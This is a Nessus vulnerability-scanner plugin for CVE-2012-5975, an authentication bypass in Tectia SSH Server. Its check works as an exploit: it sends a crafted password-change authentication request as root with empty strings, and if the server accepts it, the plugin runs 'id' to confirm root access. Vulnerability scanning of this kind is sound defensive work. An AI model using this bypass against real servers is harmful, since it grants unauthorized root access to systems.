#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(63156);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2016/11/03 20:40:06 $");

  script_cve_id("CVE-2012-5975");
  script_bugtraq_id(56783);
  script_osvdb_id(88103);
  script_xref(name:"EDB-ID", value:"23082");

  script_name(english:"Tectia SSH Server Authentication Bypass");
  script_summary(english:"Tries to bypass auth and run a command");

  script_set_attribute(attribute:"synopsis", value:
"An SSH server running on the remote host is affected by an
authentication bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Tectia SSH Server running on the remote host is
affected by an authentication bypass vulnerability.  A remote,
unauthenticated attacker can bypass authentication by sending a
specially crafted request, allowing the attacker to authenticate as
root. 

The software is only vulnerable when running on Unix or Unix-like
operating systems.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2012/Dec/12");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2012/Dec/64");
  # http://answers.tectia.com/questions/2178/can-i-have-info-about-ssh-remote-bypass-vulnerability
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?7b7686fa");
  script_set_attribute(attribute:"solution", value:
"Disable password authentication in the ssh-server-config.xml
configuration file (this file needs to be created if it does not
already exist).  Refer to the vendor's advisory for more information."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Tectia SSH USERAUTH Change Request Password Reset Vulnerability');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/12/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/12/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ssh:tectia_server");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("ssh_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/ssh", 22);
  script_exclude_keys("global_settings/supplied_logins_only");

  exit(0);
}

include('audit.inc');
include('byte_func.inc');
include('global_settings.inc');
include('misc_func.inc');
include('ssh_func.inc');

user = 'root';

# Unless paranoid, before making any requests, make sure
# the host is not running Windows (reportedly not affected)...
if (report_paranoia < 2 && os = get_kb_item('Host/OS'))
{
  if ('Windows' >< os)
    audit(AUDIT_HOST_NOT, 'Unix/Linux');
}

port = get_service(svc:'ssh', default:22, exit_on_fail:TRUE);

# ...and make sure the SSH service looks like ssh tectia server
if (report_paranoia < 2 && banner = get_kb_item("SSH/banner/" + port))
{
  if ('SSH Tectia Server' >!< banner)
    audit(AUDIT_NOT_LISTEN, 'Tectia SSH Server', port);
}
if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

# the workaround is to disable password auth. if it's not advertised,
# there's no point in attempting the exploit
authtypes = get_kb_item('SSH/supportedauth/' + port);
if (!isnull(authtypes))
{
  password_auth = FALSE;

  foreach authtype (split(authtypes, sep:',', keep:FALSE))
  {
    if (authtype == 'password')
      password_auth = TRUE;
  }

  if (!password_auth)
    audit(AUDIT_LISTEN_NOT_VULN, 'SSH', port);
}

if (!get_port_state(port))
  audit(AUDIT_PORT_CLOSED, port);

_ssh_socket = open_sock_tcp(port);
if (!_ssh_socket)
  audit(AUDIT_SOCK_FAIL, port);

# initialization
init();
server_version = ssh_exchange_identification();
if (!server_version)
  audit(AUDIT_FN_FAIL, 'ssh_exchange_identification');

_ssh_server_version = server_version;

# key exchange
ret = ssh_kex2(server_version:server_version, nofingerprint:TRUE);
if (ret != 0)
  audit(AUDIT_FN_FAIL, 'ssh_kex2');

payload = putstring(buffer:"ssh-userauth");
send_ssh_packet(payload:payload, code:raw_string(0x05));

payload = recv_ssh_packet();
if (ord(payload[0]) != 6)
  audit(AUDIT_RESP_BAD, port, 'SSH2_MSG_SERVICE_REQUEST');

# SSH_MSG_USERAUTH_REQUEST
# http://www.ietf.org/rfc/rfc4252.txt page 10
payload =
  putstring(buffer:user) +
  putstring(buffer:"ssh-connection") +
  putstring(buffer:"password") +
  raw_int8(i:1) +
  putstring(buffer:'') +
  putstring(buffer:'');
send_ssh_packet(payload:payload, code:raw_int8(i:50));

# a response of SSH_MSG_USERAUTH_SUCCESS indicates authentication succeeded.
# otherwise, the system probably isn't vulnerable
payload = recv_ssh_packet();
if (ord(payload[0]) != 52)
  audit(AUDIT_LISTEN_NOT_VULN, 'SSH', port);

output = ssh_cmd(cmd:'id', nosh:TRUE, nosudo:TRUE);
if ('uid=' >!< output)
  audit(AUDIT_RESP_BAD, port, 'id');

if (report_verbosity > 0)
{
  report = '\nNessus bypassed authentication and executed "id", which returned :\n\n' + output;
  security_hole(port:port, extra:report);
}
else security_hole(port);  

